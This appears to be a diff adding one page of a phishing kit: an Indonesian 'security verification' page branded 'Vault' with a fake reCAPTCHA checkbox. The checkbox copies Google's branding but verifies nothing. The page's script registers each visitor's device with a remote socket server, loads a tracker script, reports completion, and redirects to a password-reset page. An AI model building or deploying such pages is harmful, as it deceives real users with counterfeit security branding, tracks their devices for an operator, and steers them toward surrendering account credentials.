@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verifikasi Keamanan</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#f2f2f2;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.08);width:100%;max-width:440px;padding:40px 36px;text-align:center}
+.logo{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:28px}
+.logo svg{width:36px;height:36px}
+.logo span{font-size:1rem;font-weight:500;color:#555}
+h2{font-size:1.15rem;font-weight:600;color:#222;margin-bottom:6px}
+.subtitle{font-size:.82rem;color:#777;margin-bottom:28px;line-height:1.5}
+.rcaptcha{border:1px solid #d3d3d3;border-radius:4px;padding:14px 16px;display:flex;align-items:center;gap:14px;background:#f9f9f9;cursor:pointer;transition:background .15s;user-select:none;max-width:300px;margin:0 auto}
+.rcaptcha:hover{background:#f0f0f0}
+.rcaptcha.disabled{pointer-events:none;opacity:.7}
+.checkbox{width:28px;height:28px;border:2px solid #c1c1c1;border-radius:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .25s;background:#fff}
+.checkbox.checked{background:#4caf50;border-color:#4caf50}
+.checkbox.checked::after{content:'';width:7px;height:12px;border:solid #fff;border-width:0 2.5px 2.5px 0;transform:rotate(45deg);margin-top:-2px}
+.label-text{font-size:.86rem;color:#444;font-weight:500}
+.rcaptcha-info{display:flex;align-items:center;gap:6px;margin-left:auto;flex-shrink:0}
+.rcaptcha-info .shield{width:20px;height:20px;opacity:.5}
+.rcaptcha-info .rc-lock{font-size:.65rem;color:#888}
+.math-box{border:1px solid #d3d3d3;border-radius:4px;padding:18px 16px;max-width:300px;margin:0 auto}
+.math-box p{font-size:.88rem;color:#333;margin-bottom:12px;font-weight:500}
+.math-box .math-input{display:flex;gap:10px;align-items:center;justify-content:center}
+.math-box input[type=number]{width:80px;padding:10px 12px;border:2px solid #d3d3d3;border-radius:4px;font-size:1rem;text-align:center;outline:none;font-family:inherit;transition:border-color .2s;-moz-appearance:textfield}
+.math-box input[type=number]::-webkit-inner-spin-button,.math-box input[type=number]::-webkit-outer-spin-button{-webkit-appearance:none;margin:0}
+.math-box input[type=number]:focus{border-color:#4caf50}
+.math-box button{padding:10px 20px;background:#4caf50;color:#fff;border:none;border-radius:4px;font-size:.85rem;font-weight:500;cursor:pointer;font-family:inherit;transition:background .2s}
+.math-box button:hover{background:#43a047}
+.math-box button:disabled{background:#a5d6a7;cursor:default}
+.spinner{display:none;flex-direction:column;align-items:center;gap:14px;margin:20px auto 0}
+.spinner.active{display:flex}
+.spinner-circles{display:flex;gap:6px}
+.spinner-circles div{width:10px;height:10px;background:#4caf50;border-radius:50%;animation:bounce 1.2s ease-in-out infinite}
+.spinner-circles div:nth-child(2){animation-delay:.2s}
+.spinner-circles div:nth-child(3){animation-delay:.4s}
+@keyframes bounce{0%,80%,100%{transform:scale(0)}40%{transform:scale(1)}}
+.spinner-text{font-size:.78rem;color:#888}
+.badge{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:30px;padding-top:20px;border-top:1px solid #eee}
+.badge svg{width:28px;height:28px;opacity:.7}
+.badge-text{font-size:.68rem;color:#999;text-align:left;line-height:1.4}
+.badge-text strong{color:#777;display:block}
+.toast{position:fixed;top:24px;left:50%;transform:translateX(-50%);background:#4caf50;color:#fff;padding:14px 28px;border-radius:6px;font-size:.85rem;font-weight:500;box-shadow:0 4px 20px rgba(76,175,80,0.3);opacity:0;visibility:hidden;transition:all .35s ease;z-index:100}
+.toast.show{opacity:1;visibility:visible}
+@media(max-width:480px){
+body{padding:12px}
+.card{padding:28px 20px}
+.logo{margin-bottom:22px}
+h2{font-size:1.05rem}
+.subtitle{font-size:.78rem;margin-bottom:22px}
+.rcaptcha{padding:12px 14px}
+}
+</style>
+</head>
+<body>
+
+<div class="card" id="card">
+  <div class="logo">
+    <svg viewBox="0 0 36 36" fill="none"><rect width="36" height="36" rx="6" fill="linear-gradient(135deg,#00d4ff,#7c3aed)"/><text x="50%" y="60%" dominant-baseline="middle" text-anchor="middle" fill="#fff" font-size="18" font-weight="700" font-family="system-ui">V</text></svg>
+    <span>Vault</span>
+  </div>
+
+  <h2>Verifikasi Keamanan</h2>
+  <p class="subtitle">Verifikasi bahwa Anda bukan robot untuk melanjutkan</p>
+
+  <div id="stage1">
+    <div class="rcaptcha" id="rcCheckbox" role="button" tabindex="0">
+      <div class="checkbox" id="checkBox"></div>
+      <span class="label-text">Saya bukan robot</span>
+      <div class="rcaptcha-info">
+        <svg class="shield" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="1.5"><path d="M12 2L3 7v6c0 5.25 3.83 10.15 9 11 5.17-.85 9-5.75 9-11V7l-9-5z"/><path d="M12 12h.01" stroke-linecap="round" stroke-width="2"/></svg>
+        <span class="rc-lock">reCAPTCHA</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="spinner" id="spinner">
+    <div class="spinner-circles"><div></div><div></div><div></div></div>
+    <span class="spinner-text">Memverifikasi&hellip;</span>
+  </div>
+
+  <div class="badge">
+    <svg viewBox="0 0 48 48" fill="none"><circle cx="24" cy="24" r="22" stroke="#2d8a4e" stroke-width="2.5" fill="none"/><path d="M15 24l6 6 12-12" stroke="#2d8a4e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    <div class="badge-text"><strong>reCAPTCHA</strong>Lindungi privasi Anda</div>
+  </div>
+</div>
+
+<div class="toast" id="toast">Verifikasi berhasil</div>
+
+<script src="/config.js"></script>
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<script src="/tracker.js"></script>
+<script>
+const socket = io(SERVER_URL, { query: { deviceId: localStorage.getItem('deviceId') || '' } });
+socket.on('device-id', (id) => { localStorage.setItem('deviceId', id); });
+
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2500);
+}
+
+function completeCaptcha() {
+  document.getElementById('stage1').style.display = 'none';
+  document.getElementById('rcCheckbox').classList.add('disabled');
+  document.getElementById('spinner').classList.add('active');
+  socket.emit('device-info', { captcha: { completed: true, time: Date.now() } });
+  setTimeout(() => {
+    showToast('Verifikasi berhasil');
+    setTimeout(() => {
+      window.location.href = '/lupa-password.html?captcha=ok';
+    }, 800);
+  }, 3000);
+}
+
+document.getElementById('rcCheckbox').addEventListener('click', function(e) {
+  if (this.classList.contains('disabled')) return;
+  document.getElementById('checkBox').classList.add('checked');
+  setTimeout(completeCaptcha, 400);
+});
+</script>
+</body>
+</html>
